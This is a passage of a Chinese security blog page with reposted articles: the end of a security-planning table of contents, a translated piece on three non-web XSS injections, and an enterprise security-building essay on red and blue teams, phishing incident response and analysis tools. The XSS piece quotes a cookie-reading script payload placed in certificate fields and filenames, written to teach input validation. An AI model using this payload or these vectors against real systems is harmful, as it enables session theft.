<span class="number">7</span></span><br><span class="line"><span class="number">5.2</span> 安全组织职责  <span class="number">7</span></span><br><span class="line"><span class="number">5.2</span><span class="number">.1</span>   安全协调组织职责    <span class="number">7</span></span><br><span class="line"><span class="number">5.2</span><span class="number">.2</span>   安全响应中心职责    <span class="number">8</span></span><br><span class="line"><span class="number">5.2</span><span class="number">.3</span>   各分支机构安全组织职责 <span class="number">8</span></span><br><span class="line"><span class="number">5.3</span> 安全人员管理  <span class="number">9</span></span><br><span class="line"><span class="number">6</span>   安全防护重点风险分析  <span class="number">10</span></span><br><span class="line"><span class="number">7</span>   信息安全保障体系建设  <span class="number">10</span></span><br><span class="line"><span class="number">7.1</span> 信息安全管理体系建设  <span class="number">10</span></span><br><span class="line"><span class="number">7.1</span><span class="number">.1</span>   组织结构    <span class="number">10</span></span><br><span class="line"><span class="number">7.1</span><span class="number">.2</span>   安全培训    <span class="number">10</span></span><br><span class="line"><span class="number">7.1</span><span class="number">.3</span>   标准、制度和流程    <span class="number">24</span></span><br><span class="line"><span class="number">7.1</span><span class="number">.4</span>   外部联系工作  <span class="number">24</span></span><br><span class="line"><span class="number">7.2</span> 信息安全技术体系建设  <span class="number">24</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.1</span>   物理安全    <span class="number">24</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.2</span>   网络安全    <span class="number">25</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.3</span>   主机安全    <span class="number">25</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.4</span>   云安全 <span class="number">25</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.5</span>   应用安全    <span class="number">26</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.6</span>   数据安全    <span class="number">26</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.7</span>   业务安全    <span class="number">26</span></span><br><span class="line"><span class="number">7.2</span><span class="number">.8</span>   隐私保护    <span class="number">26</span></span><br><span class="line"><span class="number">7.3</span> 信息安全运行体系建设  <span class="number">27</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.1</span>   资产和漏洞生命周期管理 <span class="number">27</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.2</span>   发布和变更管理 <span class="number">28</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.3</span>   信息安全事件管理和应急演练   <span class="number">28</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.4</span>   重要时期信息安全保障  <span class="number">31</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.5</span>   日常工作和迎检工作   <span class="number">31</span></span><br><span class="line"><span class="number">7.3</span><span class="number">.6</span>   软件安全开发生命周期  <span class="number">31</span></span><br><span class="line"><span class="number">8</span>   办公网安全   <span class="number">32</span></span><br><span class="line"><span class="number">8.1</span> 网络安全    <span class="number">32</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.1</span>   边界控制    <span class="number">32</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.2</span>   安全域划分   <span class="number">32</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.3</span>   入侵检测    <span class="number">33</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.4</span>   上网行为管理  <span class="number">33</span></span><br><span class="line"><span class="number">8.1</span><span class="number">.5</span>   远程访问    <span class="number">33</span></span><br><span class="line"><span class="number">8.2</span> 终端安全    <span class="number">33</span></span><br><span class="line"><span class="number">8.2</span><span class="number">.1</span>   杀毒软件管理  <span class="number">33</span></span><br><span class="line"><span class="number">8.2</span><span class="number">.2</span>   补丁管理    <span class="number">33</span></span><br><span class="line"><span class="number">8.2</span><span class="number">.3</span>   主机加固    <span class="number">33</span></span><br><span class="line"><span class="number">8.3</span> 无线和手机设备安全   <span class="number">34</span></span><br><span class="line"><span class="number">8.3</span><span class="number">.1</span>   无线安全    <span class="number">34</span></span><br><span class="line"><span class="number">8.3</span><span class="number">.2</span>   移动设备管理  <span class="number">34</span></span><br><span class="line"><span class="number">8.4</span> 数据防泄密   <span class="number">34</span></span><br><span class="line"><span class="number">8.5</span> 内部系统安全  <span class="number">34</span></span><br><span class="line"><span class="number">9</span>   重点信息安全风险与保障体系对应关系   <span class="number">34</span></span><br><span class="line"><span class="number">9.1</span> 风险与保障体系对应关系 <span class="number">34</span></span><br><span class="line"><span class="number">9.2</span> 保障体系与合规性对应关系    <span class="number">35</span></span><br><span class="line"><span class="number">10</span>  工作规划和计划 <span class="number">35</span></span><br><span class="line"><span class="number">10.1</span>    工作分解思路  <span class="number">35</span></span><br><span class="line"><span class="number">10.2</span>    重点系统开发计划    <span class="number">36</span></span><br><span class="line"><span class="number">10.3</span>    长期工作规划  <span class="number">36</span></span><br><span class="line"><span class="number">10.4</span>    本年度工作计划 <span class="number">36</span></span><br><span class="line"><span class="number">11</span>  信息安全工作度量    <span class="number">36</span></span><br><span class="line"><span class="number">11.1</span>    评价体系和原则 <span class="number">37</span></span><br><span class="line"><span class="number">11.1</span><span class="number">.1</span>  评价体系    <span class="number">37</span></span><br><span class="line"><span class="number">11.1</span><span class="number">.2</span>  选拔机制    <span class="number">37</span></span><br><span class="line"><span class="number">11.1</span><span class="number">.3</span>  管理者的权利和义务   <span class="number">37</span></span><br><span class="line"><span class="number">11.2</span>    考核对象和考核方法   <span class="number">38</span></span><br><span class="line"><span class="number">11.2</span><span class="number">.1</span>  团队考核    <span class="number">38</span></span><br><span class="line"><span class="number">11.2</span><span class="number">.2</span>  个人考核    <span class="number">38</span></span><br><span class="line"><span class="number">11.2</span><span class="number">.3</span>  安全设备、系统效果评估 <span class="number">39</span></span><br><span class="line"><span class="number">11.2</span><span class="number">.4</span>  安全策略、安全程序效果评估   <span class="number">40</span></span><br><span class="line"><span class="number">11.3</span>    考核时间    <span class="number">40</span></span><br><span class="line"><span class="number">11.4</span>    奖励和问责   <span class="number">40</span></span><br><span class="line"><span class="number">12</span>  持续改进    <span class="number">40</span></span><br><span class="line"><span class="number">13</span>  附录  <span class="number">41</span></span><br></pre></td></tr></table></figure>
      

    </div>





    <footer class="article-footer">
      
        <a data-url="http://www.pa55w0rd.club/信息安全规划文档的编写/" data-id="cjop6haxs0028oqt6te5ylzmv" class="article-share-link" data-share="baidu" data-title="信息安全规划文档的编写  （转发）">分享到</a>
      

      
        <a href="http://www.pa55w0rd.club/信息安全规划文档的编写/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>
<!--
<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-->







  
    <article id="post-非web型xss注入漏洞" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/非web型xss注入漏洞/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-29T03:36:20.000Z" itemprop="datePublished">2018-10-29</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web安全/">web安全</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/非web型xss注入漏洞/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>看！这里有三种非Web型的XSS注入漏洞 （转发）</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <blockquote>
<p>原文：<a href="https://websec.ca/publication/Blog/Three-Non-Web-based-XSS-Injections" target="_blank" rel="noopener">https://websec.ca/publication/Blog/Three-Non-Web-based-XSS-Injections</a></p>
</blockquote>
<blockquote>
<p>译文：<a href="https://xz.aliyun.com/t/3048" target="_blank" rel="noopener">https://xz.aliyun.com/t/3048</a></p>
</blockquote>
<ul>
<li>目录<br>{:toc}</li>
</ul>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前些天，我跟老友Chris Navarrete进行了一次深入的交流，当谈及为什么选择这个职业时，我给出的理由是：</p>
<p>我们喜欢让事物以迥异于初衷的方式运作，例如利用缓冲区溢出来改变执行流程的方向、将JavaScript代码注入到不该注入的地方。</p>
<p>对于大部分Web安全方面的教程来说，都是教我们如何以非常简单的方式来测试XSS漏洞 “XSS漏洞”)：在反射或存储Web请求中的数据输入时，没有进行严格的安全过滤处理，从而导致反射型XSS或存储型XSS漏洞。</p>
<p>通常情况下，当讨论应用程序的安全性时，我们都知道“永远不要信任任何数据输入”这道圣谕；遗憾的是，并非所有开发人员都透彻地理解了“任何数据输入”的真正含义，因此，攻击者总有许多可乘之机。下面，我们举例进行说明：</p>
<h2 id="0x01-PowerDNS-Recursor"><a href="#0x01-PowerDNS-Recursor" class="headerlink" title="0x01 PowerDNS Recursor"></a>0x01 PowerDNS Recursor</h2><p>在我们的讨论中，Chris曾经提到曾在一个流行的DNS软件中发现了一个不同寻常的XSS漏洞，所以，我决定以它为例，让读者意识到Web并非唯一的攻击向量。</p>
<p>PowerDNS Recursor是一款高端、高性能的名称解析服务器，至少可以为1亿用户提供DNS解析服务。该产品的设计初衷，主要就是将其用于DNS解析服务器。</p>
<p>有一篇<a href="https://www.fortinet.com/blog/threat-research/powerdns-recursor-html-script-injection-vulnerability-a-walkthrough.html" target="_blank" rel="noopener">文章</a>详细展示了如何使用命令行工具dig通过DNS查询注入XSS有效载荷的过程：</p>
<p><img src="\assets\img\xss\1.png" alt="1"></p>
<p>之后，我们会在Web UI中看到：</p>
<p><img src="\assets\img\xss\2.png" alt="1"></p>
<h2 id="0x02-Symantec-SSL-Toolbox"><a href="#0x02-Symantec-SSL-Toolbox" class="headerlink" title="0x02 Symantec SSL Toolbox"></a>0x02 Symantec SSL Toolbox</h2><p>这是三年前我在赛门铁克的SSL Certificate Tester中找到的一个漏洞，在我提交后，目前该漏洞已经得到了修复。这个免费在线服务用于从给定URL的x509 SSL证书中提取和显示相应的值，由于它完全信任这些内容，所以没有对各个字段中的数据进行安全过滤。</p>
<p>因此，我创建了一个SSL证书，使其不同的字段中值都为<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>，并将其安装在Web服务器的前端：</p>
<p><img src="\assets\img\xss\3.png" alt="1"></p>
<p>所以，这个免费服务解析该证书的时候，就会执行JavaScript代码：</p>
<p><img src="\assets\img\xss\4.png" alt="1"></p>
<h2 id="0x03-RATS（Rough-Auditing-Tool-for-Security）"><a href="#0x03-RATS（Rough-Auditing-Tool-for-Security）" class="headerlink" title="0x03 RATS（Rough Auditing Tool for Security）"></a>0x03 RATS（Rough Auditing Tool for Security）</h2><p>RATS由CERN计算机安全部门开发一款非常优秀的静态代码分析工具。我个人非常喜欢这款工具，并且已经用了许多年了。然而，该工具已经于2013年12月停止更新，估计现在已经没有人在维护该项目了，但具体情况我也拿不准。</p>
<p>去年的时候，由于坐火车时很无聊，为了打发时间，竟然在该软件中找到了一个XSS漏洞。RATS需要接收一个包含源代码的文件夹，并创建一个包含分析结果的HTML报告，其中还包括所分析文件的名称，因此，攻击向量也就非常明显了。我在其名称中创建了一个包含JavaScript代码的文件：</p>
<p><img src="\assets\img\xss\5.png" alt="1"></p>
<p>分析完成之后，注入的JavaScript代码将在报告中呈现：</p>
<p><img src="\assets\img\xss\6.png" alt="1"></p>
<p>如果我是一名开发人员，并且知道自己repos中的代码肯定会进行安全审查的话，那么，我肯定会在文件名中加入相关代码来“搞”安全审计人员。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
<li>数据输入并不一定来自HTTP请求。</li>
<li>考虑所有可能的数据输入：从文件系统到数据库、用户名、时间戳、日志，不要放过任何可能性。</li>
<li>开发人员不要信任任何数据输入，在后端使用这些数据之前，一定要对接收到的数据以及发回给用户的数据进行彻底的安全过滤。</li>
</ul>

      

    </div>





    <footer class="article-footer">
      
        <a data-url="http://www.pa55w0rd.club/非web型xss注入漏洞/" data-id="cjop6hax5001toqt6nebp89pg" class="article-share-link" data-share="baidu" data-title="看！这里有三种非Web型的XSS注入漏洞 （转发）">分享到</a>
      

      
        <a href="http://www.pa55w0rd.club/非web型xss注入漏洞/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>
<!--
<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-->







  
    <article id="post-甲方安全建设的一些思路和思考" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/甲方安全建设的一些思路和思考/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-29T03:35:20.000Z" itemprop="datePublished">2018-10-29</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/categories/安全建设/">安全建设</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/甲方安全建设的一些思路和思考/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>甲方安全建设的一些思路和思考 （转发）</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <blockquote>
<p>转自  <a href="https://mp.weixin.qq.com/s/quwaJMVHYpBAXpkgtR12Kw" target="_blank" rel="noopener">安全小飞侠 https://mp.weixin.qq.com/s/quwaJMVHYpBAXpkgtR12Kw</a> </p>
</blockquote>
<ul>
<li>目录<br>{:toc}</li>
</ul>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文主要是介绍一下笔者对于甲方安全能力建设的一些经验，心得和零散的思考。需要特别强调的是不同企业的实际情况不尽相同，本文仅供参考，不具普遍意义。</p>
<h2 id="0x01-Red-Teaming"><a href="#0x01-Red-Teaming" class="headerlink" title="0x01 Red Teaming"></a>0x01 Red Teaming</h2><p>近几年随着Red Team建设的话题越来越流行，不管是甲方或者乙方都在极力的发展自己的Red Teaming能力，尤其是各个乙方都推出了自己的Red Team的服务，如：<a href="https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/pf/ms/ds-red-team-for-security-operations.pdf" target="_blank" rel="noopener">FireEye</a>，但是最终目的都是为甲方输出检验企业的Detection和Response的能力，找到防御弱点进而优化防御系统和流程。</p>
<p>我们不禁要思考一下，到底什么样的企业才真的需要Red Team？当然，输出安全能力和服务的乙方不在讨论范围内，因为其最终是为了服务和支持甲方。根据我的观察和发现，目前大部分人很容易把Red Team和Penetration Testing弄混或者干脆混为一谈。其实二者有共同点但也有本质上的不同，简单做个比喻就是忍者(隐秘，快速，准确，一击即中)和海盗（强壮，贪婪，可以刚正面，一波高地）的区别，各有侧重和优劣，但侧重点不同，比如，Red Team类似忍者，侧重于精心准备（如：社会工程学等）收集信息进而绕过现有的防御体系（类似于APT）来检验防御和检测能力；而Penetration Testing则如同海盗，侧重于尽可能多地发现应用，系统，网络，设备等的漏洞，并利用其发现更深层或者复杂的漏洞从而来评估风险。所以，答案显而易见，一个企业只有拥有了基本的防御和检测的能力，并需要持续检测和改善这种能力时，Red Team就是很好地选择了。</p>
<p>那么，什么样的Red Team才算合格和有效呢？如前面所说，Red Team如同忍者去做暗杀，既然暗杀那么就需要一个详细的计划，如：目标是什么（暗杀对方头目），手段是什么（前期侦查对方大本营，守卫布局，对方头目的日常习惯和出现的场所，会不会功夫等），如何去执行（选择某个夜黑风高的晚上，众人都准备或者已经睡觉的时候，摸进对方大本营，提前隐藏在对方头目习惯出现的场所，等待其出现，再一刀毙命）。对应到Red Team就是，</p>
<ol>
<li><p>设置好这次行动目的是模拟偷取公司的客户资料；</p>
</li>
<li><p>提前做好侦查看看公司都可能有哪些人会碰到这类数据，有哪些防御检测方式（如：反病毒，入侵检测，流量分析）；</p>
</li>
<li><p>针对可能接触数据的人员做定向钓鱼攻击或者面对面的社工，安装专门制作的绕杀软的工具，利用常见的社交或者云存储网站来做C2，等待时机控制机器，获取必要的用户凭证，盗取客户资料，销毁痕迹，最终走人。</p>
</li>
</ol>
<p>因此，一个合格的Red Team，需要具备模拟攻击者入侵的各种能力，手段以及假想的目的。想要具备这种能力的一个最简单有效的方法，就是从现有的真实世界里发生的APT攻击活动中抽取TTP来模拟真实的threat actors，分类并总结他们曾今采用的手段，方法，技术和工具，然后加以优化和改进，最终结合每个Red Team活动的假想目的来模拟不同APT组织对于公司的入侵，以此来检测已有的防御和响应体系是否有效。</p>
<h2 id="0x02-Blue-Teaming"><a href="#0x02-Blue-Teaming" class="headerlink" title="0x02 Blue Teaming"></a>0x02 Blue Teaming</h2><p>我们在说Blue Team时，通常是指在一个企业里负责入侵检测和应急响应的团队的统称，一般情况下（尤其是规模较大的企业）会至少细分为以下几个团队：</p>
<ul>
<li><p>Threat Hunting（入侵检测）：主要负责根据已知威胁的TTP（如APT活动）和根据常见入侵活动的行为特征（如批量端口扫描，同一系统账户的短时多次尝试登录，office软件进程的可疑子进程的派生等等）来开发入侵检测规则，或者利用机器学习，深度学习等更高级的数据挖掘技术来研究和分析威胁特征；</p>
</li>
<li><p>Incident Response（应急响应）：主要负责处理和调查企业的安全事件（如：外部应用系统被入侵，内网主机被入侵，以及由Threat Hunting的规则触发的各类入侵报警等）以及从真实的安全事件中来分析和提取资产的IOC以及最新的威胁特征；</p>
</li>
<li><p>Vulnerability Management（漏洞管理）：主要负责对企业所有资产（包括应用和原代码）的持续漏洞扫描，追踪，修复以及管理；</p>
</li>
<li><p>Threat Intelligence（威胁情报）：主要负责追踪和分析外部已知APT活动，地下黑市和深网或暗网里的各种威胁情报信息，并加以分类总结成TTP以及IOC提供给其他团队加以利用和深层分析（如前面提到的Threat Hunting，以及Red Team）。</p>
</li>
</ul>
<p>而且这些子团队都不是独立工作的，其之间都是相互配合和支持的。我们可以举个常见的例子来加以解释一下，比如threat hunting可能会通过已知的规则发现了一个可能的入侵行为；接着incident response迅速跟进进行流量、日志或者取证的分析发现了之前未被识别的威胁特征；然后threat hunting基于该特征开发最新的检测规则，threat intelligence以此进行情报梳理和比对并最终发现这是某个最近比较活跃的APT组织的活动，随后搜集相关TTP反馈给threat hunting；最后，vulnerability management团队扫描企业所有可能存在弱点和受影响资产，追踪和修复。</p>
<p>综上可见，Blue Team不是gank选手，而是讲究的团队合作和相互配合的团战协作，合理的利用和集合各个子团队的优势便可以大大提高入侵检测的准确性和应急响应的快速性。</p>
<h2 id="0x03-应急响应"><a href="#0x03-应急响应" class="headerlink" title="0x03 应急响应"></a>0x03 应急响应</h2><p>在开始之前，先谈谈我个人理解的应急响应是什么？顾名思义就是对企业发生的安全事件作出快速应对和及时响应从而减少由于安全事件造成的影响。</p>
<p>一般情况下，任何安全事件的应急响应都可以分为以下几个阶段：</p>
<ol>
<li><p>Assessment（评估）：主要是初步梳理安全事件产生的原因和评估潜在影响范围；</p>
</li>
<li><p>Containment（控制）：这个阶段主要是快速找到止损/减轻方案（或者是临时应对措施）将事件影响尽可能控制在最小范围内；</p>
</li>
<li><p>Eradication（消除）：这个阶段是要找到安全事件产生的根本原因并提出和实施根治方案；</p>
</li>
<li><p>Recovery（恢复）：主要是确保所有受影响的系统或者服务完全恢复到安全状态；</p>
</li>
<li><p>Review（总结和审查）：这是每个应急响应的最后阶段主要是总结和梳理安全事件处理和响应的整个时间线和应对方案，学习和审查安全事件产生的根本原因并生成知识库以便以后遇到同类安全事件可以快速地找到处理和应对的方法。</p>
</li>
</ol>
<p>为了便于大家更好地理解怎么运用以上这些步骤来帮助我们做好应急响应，以下我以一个企业经常会碰到的钓鱼邮件为案例。比如，我们的企业员工上报了一封钓鱼邮件，那么作为应急响应团队应该怎么做？我们都知道钓鱼邮件是入侵者（APT组织）攻击大型企业的最直接有效的方法。当我们的应急响应人员遇到这样的攻击试图时，</p>
<p>第一步，我们要初步分析钓鱼邮件的攻击方法，通常有：</p>
<ul>
<li><p>Credential Harvesting：设置一个伪造的邮箱或者系统登录界面（如发送一个诱饵链接或者在邮件里嵌入一个html页面）来盗取有效的用户名和密码；</p>
</li>
<li><p>Malware：一般包括两种方式，一是通过附件直接发送恶意文件，二是通过发送链接来诱骗用户点击下载恶意文件。初步分析了攻击方法，我们就需要评估影响，比如，哪些人收到了该邮件，哪些人可能访问了恶意链接，哪些人下载了恶意文件，哪些人执行了恶意文件，哪些数据可能受到影响等等；</p>
</li>
</ul>
<p>第二步，实施控制措施或者减轻方案，如针对通过链接来偷取用户名和密码或者下载第一阶段的恶意文件的域名我们可以实施DNS sinkhole（详情可以参照：<a href="https://en.m.wikipedia.org/wiki/DNS_sinkhole），对于利用附件直接发送恶意文件的情况我们可以通过静态或者动态沙箱（例如cuckoo，virustotal等）来分析恶意文件的行为并抽取IOC（可能是后续阶段C2的域名或者IP，亦或者是执行的子命令）实施DNS" target="_blank" rel="noopener">https://en.m.wikipedia.org/wiki/DNS_sinkhole），对于利用附件直接发送恶意文件的情况我们可以通过静态或者动态沙箱（例如cuckoo，virustotal等）来分析恶意文件的行为并抽取IOC（可能是后续阶段C2的域名或者IP，亦或者是执行的子命令）实施DNS</a> sinkhole，防火墙IP黑名单，或者终端防安全防护软件添加行为识别特征或者文件hash黑名单等等措施；</p>
<p>第三步，当恶意行为被有效控制后，我们便需要实施清除活动，如：清除所有收到的恶意邮件，对访问过恶意链接并且可能潜在泄露过用户名和密码的用户进行账号重置，对于下载执行过恶意文件或者访问过后续阶段的域名或者IP的用户电脑进行重装等等；</p>
<p>第四步，这个阶段我们需要确保我们在第三步中的所有清除活动按照预期完成，并且所有用户和系统恢复正常使用；</p>
<p>第五步，当一切恢复正常，我们需要对这次的钓鱼邮件事件做复盘分析，如：为什么我们的邮件安全网关没有检测到和拦截这个钓鱼邮件？为什么我们的员工会点击这些钓鱼邮件？我们的防御和检测的漏洞在哪？下次再发生类似事件我们应该怎么办？等这些问题都找到对应的答案了我们则需要录入应急响应知识库以备后用。</p>
<p>综上，一个有效的应急响应是需要一个相对完整的流程来保证，如此一来便可以保证应急时不慌乱有条理且快速有效。</p>
<h2 id="0x04-内网入侵检测与防御"><a href="#0x04-内网入侵检测与防御" class="headerlink" title="0x04 内网入侵检测与防御"></a>0x04 内网入侵检测与防御</h2><p>本章节将依据我个人的一些工作经验和思考分别从平台搭建，工具配置，入侵调查与分析三个方面来聊聊企业的内网入侵检测和防御的建设思路。</p>
<h3 id="平台篇"><a href="#平台篇" class="headerlink" title="平台篇"></a>平台篇</h3><p>通常来说，一个企业要想做好内网检测和防御，首先要解决的问题就是感知能力，这就好比是人的五官要可以感知到周遭环境的变化，那么反映到安全平台上我们就需要一个统一的日志收集和分析平台。那么需要收集哪些日志呢？是所有的都收集吗？还是有选择性地收集？又如何来确定优先级呢？其实日志的收集切忌盲目全收，否则就会浪费了大量的人力物力财力到头来搜集了一堆日志却不知道如何使用。最好是结合应用场景来制定优先级，循序渐进。举个例子，比如当我们的一个应用场景是检测办公网中的入侵行为，我们需要解决的核心问题其实就是 <strong>谁在什么时间什么机器上运行了什么进程做了什么操作</strong>。分解一下这个问题，首先我们需要有日志能帮我们定位每个内网用户，如：DHCP，DNS，Kerberos Tickets（AD认证），Windows Event Logs，Antivirus等；接着我们想要知道什么时间什么机器上运行了什么，如：主机进程树和网络连接日志（即：Event Tracing for Windows）等；最后我们需要知道做了什么操作（网络行为等），如：网络设备出口流量，Web网关日志（HTTP流量），IDS日志，WiFi日志，邮件网关日志等等。这样，我们就能有针对性地收集我们当下最需要的日志并可以利用这种方法来逐步扩大日志收集的种类。</p>
<p>有了统一的日志收集平台，接下来我们便需要一个持续的威胁检测平台其主要作用就是编写各种检测规则和机器学习模型来对所有收集到的日志进行匹配检查以保证之前的已知威胁不会被忽略。</p>
<p>接着，我们需要一个IOC检测平台，其主要作用是用来对外部情报信息或者内部自产的情报信息进行实时匹配和报警以确保当前所有的已知威胁能被检测出来。</p>
<p>最后，我们还需要一个内部威胁追踪和记录平台，其主要作用是用于流程化和规范化地记录和总结所有以往发生的入侵事件的调查过程和分析结果以便于日后查询和关联分析。</p>
<p>总之，安全平台建设是企业内网入侵检测和防御的基础，只有搭建了这些基础平台，才能谈后续的工具配置和入侵分析与调查。</p>
<h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><p>在上一篇中我们聊到安全平台建设是企业内网入侵检测和防御的基础，在这个基础之上今天我们来聊聊工具配置。简而言之，就是有了感知能力，需要哪些工具来帮助我们分析和调查入侵，所谓工欲善其事必先利其器。</p>
<p>一般来说，最常见的入侵内网的手法就是钓鱼邮件和社工，而其中以钓鱼邮件最为典型，因此做好钓鱼邮件的防范是最为简单有效的防御内网入侵的方法。我之前曾提到过钓鱼邮件的常见手法，</p>
<ul>
<li><p>发送链接模拟邮箱或者内部系统登陆界面收集企业员工的账号密码；</p>
</li>
<li><p>发送链接诱导员工点击下载恶意的office文档；</p>
</li>
<li><p>直接发送恶意的office文档或者PE文件或者恶意程序的压缩包作为附件并诱导员工打开。</p>
</li>
</ul>
<p>针对以上几种手法，我们至少准备以下几类工具来辅助分析。</p>
<p><strong>第一类，域名与IP检测工具：</strong></p>
<p><a href="https://centralops.net/co/DomainDossier.aspx?dom_whois=1&amp;net_whois=1&amp;dom_dns=1" target="_blank" rel="noopener">https://centralops.net/co/DomainDossier.aspx?dom_whois=1&amp;net_whois=1&amp;dom_dns=1</a></p>
<p><a href="https://www.threatcrowd.org/" target="_blank" rel="noopener">https://www.threatcrowd.org/</a></p>
<p><a href="https://www.threatminer.org/" target="_blank" rel="noopener">https://www.threatminer.org/</a></p>
<p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p>
<p><a href="https://www.talosintelligence.com/" target="_blank" rel="noopener">https://www.talosintelligence.com/</a></p>
<p><a href="https://login.opendns.com/" target="_blank" rel="noopener">https://login.opendns.com/</a></p>
<p><a href="https://www.alexa.com/siteinfo" target="_blank" rel="noopener">https://www.alexa.com/siteinfo</a></p>
<p><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></p>
<p><a href="https://checkphish.ai/domain/avfisher.win" target="_blank" rel="noopener">https://checkphish.ai/domain/avfisher.win</a></p>
<p><strong>第二类，URL检测工具：</strong></p>
<p><a href="https://urlscan.io/" target="_blank" rel="noopener">https://urlscan.io/</a></p>
<p><a href="https://sitecheck.sucuri.net/results/pool.cortins.tk" target="_blank" rel="noopener">https://sitecheck.sucuri.net/results/pool.cortins.tk</a></p>
<p><a href="https://quttera.com/" target="_blank" rel="noopener">https://quttera.com/</a></p>
<p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p>
<p><a href="https://checkphish.ai/" target="_blank" rel="noopener">https://checkphish.ai/</a></p>
<p><strong>第三类，TOR节点检测工具：</strong></p>
<p><a href="https://www.dan.me.uk/torcheck" target="_blank" rel="noopener">https://www.dan.me.uk/torcheck</a></p>
<p><a href="https://exonerator.torproject.org/" target="_blank" rel="noopener">https://exonerator.torproject.org/</a></p>
<p><a href="https://ipduh.com/ip/tor-exit/" target="_blank" rel="noopener">https://ipduh.com/ip/tor-exit/</a></p>
<p><a href="https://torstatus.blutmagie.de/" target="_blank" rel="noopener">https://torstatus.blutmagie.de/</a></p>
<p><strong>第四类，在线恶意程序或文档检测工具：</strong></p>
<p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p>
<p><a href="https://malwr.com/" target="_blank" rel="noopener">https://malwr.com/</a></p>
<p><a href="http://camas.comodo.com/" target="_blank" rel="noopener">http://camas.comodo.com/</a></p>
<p><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></p>
<p><a href="https://www.reverse.it/" target="_blank" rel="noopener">https://www.reverse.it/</a></p>
<p><a href="http://www.threatexpert.com/submit.aspx" target="_blank" rel="noopener">http://www.threatexpert.com/submit.aspx</a></p>
<p><a href="https://www.vicheck.ca/" target="_blank" rel="noopener">https://www.vicheck.ca/</a></p>
<p><a href="https://virusshare.com/" target="_blank" rel="noopener">https://virusshare.com/</a></p>
<p><a href="https://malshare.com/" target="_blank" rel="noopener">https://malshare.com/</a></p>
<p><a href="https://github.com/ytisf/theZoo" target="_blank" rel="noopener">https://github.com/ytisf/theZoo</a></p>
<p><strong>第五类，动态恶意程序或文档分析工具：</strong></p>
<p>Cuckoo: <a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a></p>
<p>Regshot: <a href="https://sourceforge.net/projects/regshot/" target="_blank" rel="noopener">https://sourceforge.net/projects/regshot/</a></p>
<p>Process Hacker: <a href="http://processhacker.sourceforge.net/" target="_blank" rel="noopener">http://processhacker.sourceforge.net/</a></p>
<p>Process Monitor: <a href="https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx</a></p>
<p>ProcDOT: <a href="https://www.cert.at/downloads/software/procdot_en.html" target="_blank" rel="noopener">https://www.cert.at/downloads/software/procdot_en.html</a></p>
